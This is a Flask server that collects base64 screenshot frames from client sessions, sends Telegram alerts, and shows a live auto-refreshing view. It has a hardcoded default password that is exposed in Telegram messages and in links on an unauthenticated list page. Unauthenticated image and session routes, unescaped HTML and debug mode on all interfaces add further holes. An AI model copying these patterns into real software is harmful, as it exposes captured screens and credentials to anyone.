import os
import time
import base64
from flask import Flask, request, jsonify, send_from_directory, render_template_string, abort
import requests

app = Flask(__name__, static_folder='public', static_url_path='')

# Config via environment
GLOBAL_PASSWORD = os.environ.get('GLOBAL_PASSWORD', '@MadMax31')
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '').strip()
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '').strip()

# In-memory sessions map:
# session_id -> { "last_seen": ts, "image_path": "screens/<session>.jpg", "meta": {...} }
SESSIONS = {}

SCREENS_DIR = 'screens'
os.makedirs(SCREENS_DIR, exist_ok=True)


def notify_telegram(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        resp = requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text})
        return resp.ok
    except Exception as e:
        app.logger.warning("Telegram notify failed: %s", e)
        return False


@app.route('/')
def index():
    return app.send_static_file('index.html')


# Admin dashboard
@app.route('/admin')
def admin():
    return app.send_static_file('index.html')


# API: return current sessions (simple)
@app.route('/sessions', methods=['GET'])
def sessions():
    # return small cleaned view
    out = {}
    for sid, info in SESSIONS.items():
        out[sid] = {
            "last_seen": info.get("last_seen"),
            "has_image": os.path.exists(info.get("image_path", "")),
            "meta": info.get("meta", {})
        }
    return jsonify(out)


# Client: register session
@app.route('/register', methods=['POST'])
def register():
    """
    Body JSON:
    {
      "session_id": "sess_xxx",
      "meta": { "name": "device name" }   # optional
    }
    """
    data = request.get_json(force=True)
    if not data or 'session_id' not in data:
        return jsonify({"error": "session_id required"}), 400

    sid = str(data['session_id'])
    meta = data.get('meta', {})

    # store or update
    SESSIONS[sid] = {
        "last_seen": int(time.time() * 1000),
        "image_path": os.path.join(SCREENS_DIR, f"{sid}.jpg"),
        "meta": meta
    }

    # notify telegram
    notify_text = f"🖥️ New session: `{sid}`\nPassword: `{GLOBAL_PASSWORD}`"
    notify_telegram(notify_text)

    return jsonify({"status": "ok", "session_id": sid})


# Client: receive base64 image frame
@app.route('/upload', methods=['POST'])
def upload_frame():
    """
    Body JSON:
    {
      "session_id": "sess_xxx",
      "image": "<base64-data>"
    }
    """
    data = request.get_json(force=True)
    if not data or 'session_id' not in data or 'image' not in data:
        return jsonify({"error": "session_id and image required"}), 400

    sid = str(data['session_id'])
    b64 = data['image']

    if sid not in SESSIONS:
        # optional: auto-register small sessions
        SESSIONS[sid] = {
            "last_seen": int(time.time() * 1000),
            "image_path": os.path.join(SCREENS_DIR, f"{sid}.jpg"),
            "meta": {}
        }

    # decode and store
    try:
        imgdata = base64.b64decode(b64)
        path = SESSIONS[sid]['image_path']
        with open(path, 'wb') as f:
            f.write(imgdata)
        SESSIONS[sid]['last_seen'] = int(time.time() * 1000)
        return jsonify({"status": "ok"})
    except Exception as e:
        app.logger.error("Failed to save image: %s", e)
        return jsonify({"error": "failed to decode"}), 500


# Admin: view single session - returns HTML that auto-refreshes the image every 1s
@app.route('/view/<session_id>')
def view_session(session_id):
    password = request.args.get('password', '')
    if password != GLOBAL_PASSWORD:
        return abort(403, description="Invalid password")

    if session_id not in SESSIONS:
        return abort(404, description="Session not found")

    image_url = f"/screens/{session_id}.jpg"
    # Simple page that reloads the image every second (cache-busting)
    html = f"""
    <!doctype html>
    <html>
      <head>
        <meta charset="utf-8"/>
        <title>View {session_id}</title>
        <style>body{{background:#111;color:#fff;font-family:system-ui;text-align:center}} img{{max-width:95%;border:1px solid #333}}</style>
      </head>
      <body>
        <h2>Viewing: {session_id}</h2>
        <div id="imgwrap">
          <img id="frame" src="{image_url}?t={{timestamp}}" alt="no frame yet" />
        </div>
        <script>
          function reload() {{
            var img = document.getElementById('frame');
            img.src = '{image_url}?t=' + Date.now();
          }}
          setInterval(reload, 1000);
        </script>
      </body>
    </html>
    """
    return html


# Serve the stored images under /screens/<session>.jpg
@app.route('/screens/<path:filename>')
def serve_screens(filename):
    return send_from_directory(SCREENS_DIR, filename)


# Optional: simple admin static API to render list + quick links
@app.route('/admin-list')
def admin_list():
    items = []
    for sid, info in SESSIONS.items():
        items.append(f"<li>{sid} - <a href='/view/{sid}?password={GLOBAL_PASSWORD}' target='_blank'>View</a></li>")
    return "<h3>Active Sessions</h3><ul>" + "".join(items) + "</ul>"


if __name__ == '__main__':
    # Local dev: run with Flask dev server
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)), debug=True)
